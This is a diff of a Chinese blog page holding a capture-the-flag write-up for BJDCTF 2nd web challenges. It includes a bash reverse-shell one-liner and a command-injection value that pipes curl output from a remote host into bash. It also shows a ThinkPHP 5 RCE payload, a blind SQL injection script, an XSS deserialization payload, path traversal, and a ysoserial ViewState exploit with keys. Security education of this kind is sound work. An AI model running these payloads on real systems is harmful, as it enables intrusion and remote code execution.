@@ -54,20 +54,20 @@
 <meta property="og:site_name" content="Chen&#39;Blog">
 <meta property="og:description" content="记录一下，以后忘记了还能看看">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/1.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/2.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/3.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/4.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/5.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/6.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/7.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/8.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/9.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/11.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/12.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/13.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/14.jpg">
-<meta property="og:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/15.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/1.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/2.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/3.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/4.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/5.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/6.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/7.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/8.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/9.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/11.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/12.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/13.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/14.jpg">
+<meta property="og:image" content="https://chenzidu.github.io/15.jpg">
 <meta property="article:published_time" content="2020-03-28T04:56:24.000Z">
 <meta property="article:modified_time" content="2022-12-11T09:31:21.953Z">
 <meta property="article:author" content="ChenZIDu">
@@ -79,7 +79,7 @@
 <meta property="article:tag" content="Python">
 <meta property="article:tag" content="ASP.NET">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/1.jpg">
+<meta name="twitter:image" content="https://chenzidu.github.io/1.jpg">
 
 <link rel="canonical" href="https://chenzidu.github.io/2020/03/28/BJDCTF-2nd/">
 
@@ -303,12 +303,6 @@
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/ASP-NET-VIEWSTATE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
                     <span itemprop="name">ASP.NET VIEWSTATE反序列化</span>
                   </a>
@@ -335,6 +329,12 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index">
                     <span itemprop="name">PHP原生类反序列化</span>
+                  </a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
                   </a>
                 </span>
                   ，
@@ -403,38 +403,30 @@
 <li>.index.php.swp源码泄露</li>
 </ul>
 <p>一进去提示我们：<code>how can i give you source code? .swp?!</code>,获取源码后，利用vim再把它改回去就行，直接打开会乱码:<code>vim -r index.php.swp</code>恢复。</p>
-<p><img src="1.jpg" alt="vim"></p>
+<p><img src="/1.jpg" alt="vim"></p>
 <p>因为exec()无回显，而且没有禁curl。所以可以反弹shell~~</p>
 <ul>
-<li>先查看ip地址<code>ifconfig</code><br><img src="2.jpg" alt=""></li>
-<li>进入/var/www/html写一个txt文件。<br><img src="3.jpg" alt=""><ul>
+<li>先查看ip地址<code>ifconfig</code><br><img src="/2.jpg"></li>
+<li>进入&#x2F;var&#x2F;www&#x2F;html写一个txt文件。<br><img src="/3.jpg"></li>
 <li><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>ip就是本地ip,端口随便写一个</li>
-</ul>
-</li>
-<li>监听端口1234<ul>
+<li>监听端口1234</li>
 <li><code>nc -lvp 1234</code></li>
+<li>再post一个girlfriend的值</li>
+<li><code>girl_friend=curl 174.1.145.235/b.txt|bash</code><br><img src="/4.jpg" alt="hackbar"><br><img src="/5.jpg"></li>
+<li>直接cat &#x2F;flag是不会出来的</li>
+<li><code>grep -r &quot;flag{&quot; /etc</code><br> <img src="/6.jpg"></li>
 </ul>
-</li>
-<li>再post一个girlfriend的值<ul>
-<li><code>girl_friend=curl 174.1.145.235/b.txt|bash</code><br><img src="4.jpg" alt="hackbar"><br><img src="5.jpg" alt=""></li>
-</ul>
-</li>
-<li>直接cat /flag是不会出来的<ul>
-<li><code>grep -r &quot;flag{&quot; /etc</code><br><img src="6.jpg" alt=""></li>
-</ul>
-</li>
-</ul>
-<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>题目题是thinkphp5,拿通用thinkphp5的payload打了下，然后发现版本5.0.23<br><img src="7.jpg" alt=""></p>
-<p>然后拿5.0.23打了下，没看到flag，还以为我没打通,结果在最上面。。<br><img src="8.jpg" alt=""></p>
+<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>题目题是thinkphp5,拿通用thinkphp5的payload打了下，然后发现版本5.0.23<br><img src="/7.jpg"></p>
+<p>然后拿5.0.23打了下，没看到flag，还以为我没打通,结果在最上面。。<br><img src="/8.jpg"></p>
 <figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">index</span>.php?s=captcha</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">server</span>[<span class="title">REQUEST_METHOD</span>]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
 
 <h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>hint.txt有语句提示：<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code><br>对sql的注入还不太了解，放一下<a href="https://blog.csdn.net/SopRomeo/article/details/105123395" target="_blank" rel="noopener">大师傅</a>的二分注入</p>
 <figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://523c9df3-1d44-44e8-bcc5-2a8ad35c3ff4.node3.buuoj.cn/"</span></span><br><span class="line"><span class="attr">temp</span> = &#123;&#125;</span><br><span class="line"><span class="attr">password</span> = <span class="string">""</span></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    <span class="attr">low</span> = <span class="number">32</span></span><br><span class="line">    <span class="attr">high</span> =<span class="number">128</span></span><br><span class="line">    <span class="attr">mid</span> = (low+high)//<span class="number">2</span></span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        <span class="attr">payload</span> = '^ (ascii(substr((password),%d,<span class="number">1</span>))&gt;%d)<span class="comment">#' % (i,mid)</span></span><br><span class="line">        <span class="attr">temp=&#123;"username":"admin\\","password":</span> payload&#125;</span><br><span class="line">        <span class="attr">r</span> = requests.post(url,<span class="attr">data=temp)</span></span><br><span class="line">        print(low,high,mid,<span class="string">":"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"P3rh4ps"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="attr">low</span> = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="attr">high</span> = mid</span><br><span class="line">        <span class="attr">mid</span> =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="attr">mid</span> ==<span class="number">32</span> <span class="literal">or</span> <span class="attr">mid</span> ==<span class="number">127</span>):</span><br><span class="line">        break</span><br><span class="line">    password +=chr(mid)</span><br><span class="line">    print(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password="</span>,password)</span><br></pre></td></tr></table></figure>
-<p>二分注入还是快的= =</p>
+<p>二分注入还是快的&#x3D; &#x3D;</p>
 <h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>dirb扫一下，发现有git漏洞<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2" target="_blank" rel="noopener">反序列化之PHP原生类的利用</a><br>也是第一次接触到反序列化原生类</p>
 <p>利用buu里面自带的内网xss，搞得。</p>
 <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Exception(<span class="string">"&lt;script src=http://xss.buuoj.cn/bL6BFw&gt;&lt;/script&gt;"</span>);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">序列化：</span><br><span class="line">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A48%3A%22%3Cscript+src%3Dhttp%3A%2F%2Fxss.buuoj.cn%2FbL6BFw%3E%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A3%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>
-<p><img src="9.jpg" alt=""></p>
+<p><img src="/9.jpg"></p>
 <h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>抓包请求下发现L0g1n.php。<br>然后套娃：<br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers信息</a></p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">改cookie时间</span><br><span class="line">Client-ip:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>       <span class="comment">//这里XFF用不了</span></span><br><span class="line">Referer:gem-love.com     <span class="comment">//来源地址</span></span><br><span class="line">User-Agent:Commodore <span class="number">64</span>  <span class="comment">//使用的系统</span></span><br><span class="line"><span class="keyword">from</span>:<span class="symbol">root@</span>gem-love.com   <span class="comment">//请求方邮箱</span></span><br><span class="line">via:y1ng.vip             <span class="comment">//请求方代理</span></span><br></pre></td></tr></table></figure>
 <h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><p id="div-border-left-blue">一贯尿性= =。header里面有信息,提示了home.php,robots里还提示了admin.php,但是只允许本地访问。<br>home.php里可以用伪协议读取system.php的源码，如果输入了其他的后头会拼接.fxxkyou!</p>
@@ -460,19 +452,19 @@ cookie访问之前的页面就会自动获取了
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5(<span class="string">'174.0.222.75'</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cipher = aesEn(<span class="string">'NULL'</span>, <span class="string">'y1ng'</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode($cipher); <span class="comment">//70klfZeYC+WlC045CcKhtg==    要将最后的值转码</span></span><br></pre></td></tr></table></figure>
-<p>如果运行的时候报<b>Call to undefined function openssl_encrypt()</b>错，在php.ini搜索下<code>;extension=php_openssl.dll</code>去掉前面得分号即可。或者直接<a href="https://code.y444.cn/" target="_blank" rel="noopener">在线运行代码</a>。<br><img src="11.jpg" alt="之前cookie都忘记带值了，我晕~"></p>
+<p>如果运行的时候报<b>Call to undefined function openssl_encrypt()</b>错，在php.ini搜索下<code>;extension=php_openssl.dll</code>去掉前面得分号即可。或者直接<a href="https://code.y444.cn/" target="_blank" rel="noopener">在线运行代码</a>。<br><img src="/11.jpg" alt="之前cookie都忘记带值了，我晕~"></p>
 <h2 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h2><p>赵师傅的题真顶。<br>了解可以看这篇文章：<a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a><br>攻击的文章：<a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a><br>进去之后发现图片路径：<code>path=4.gif</code>,看到别的大佬说有文件包含，读取web.config文件。<br>一个个试直到：<code>path=../../web.config</code><br>发现被当作图片读取，curl下载。</p>
-<p><img src="12.jpg" alt="构造目录穿越读取web.config成功"></p>
+<p><img src="/12.jpg" alt="构造目录穿越读取web.config成功"></p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://65b7c96b<span class="string">-2005</span><span class="string">-4</span>b6b-ba0f<span class="string">-485176</span>af77c7.node3.buuoj.cn/ImgLoad.aspx?path=../../web.config</span><br></pre></td></tr></table></figure>
 <p><a href="https://github.com/ChenZIDu/EasyAspDotNet.git" target="_blank" rel="noopener">ExploitClass.cs、System.Web.dll、System.dll文件</a><br><a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.32" target="_blank" rel="noopener">ysoserial.net,直接下载带exe的</a></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span class="string">"ExploitClass.cs;./System.dll;./System.Web.dll"</span> <span class="attribute">--generator</span>=<span class="string">"CA0B0334"</span> <span class="attribute">--validationalg</span>=<span class="string">"SHA1"</span> <span class="attribute">--validationkey</span>=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9"</span> <span class="attribute">decryptionKey</span>=<span class="string">"B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5"</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="13.jpg" alt="Powershell"></p>
-<p><img src="14.jpg" alt="Postman"></p>
+<p><img src="/13.jpg" alt="Powershell"></p>
+<p><img src="/14.jpg" alt="Postman"></p>
 <p id="div-border-left-red">如果用brup注意__VIEWSTATE参数的编码问题</p>
 
-<p><img src="15.jpg" alt="Postman"></p>
-<p>拖了好多天，终于复现完了，明天可以做别的事情了<del>~</del></p>
+<p><img src="/15.jpg" alt="Postman"></p>
+<p>拖了好多天，终于复现完了，明天可以做别的事情了~~~~</p>
 <hr>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhaoj.in/read-6497.html" target="_blank" rel="noopener">BJDCTF 2nd EasyAspDotNet WriteUp</a><br><a href="https://www.gem-love.com/ctf/2097.html#DuangShell" target="_blank" rel="noopener">第二届BJDCTF 2020 全部WEB题目 Writeup</a><br><a href="https://www.cnblogs.com/Konmu/p/12549038.html#bjdctf-2ndduangshell" target="_blank" rel="noopener">Konmu</a><br><a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</a><br><a href="https://www.4hou.com/posts/GYq7" target="_blank" rel="noopener">如何借助ViewState在ASP.NET中实现反序列化漏洞利用</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">headers信息</a></p>
 
@@ -560,7 +552,7 @@ cookie访问之前的页面就会自动获取了
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">95</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -632,7 +624,7 @@ cookie访问之前的页面就会自动获取了
 <div class="copyright">
   
   &copy; 2018 – 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
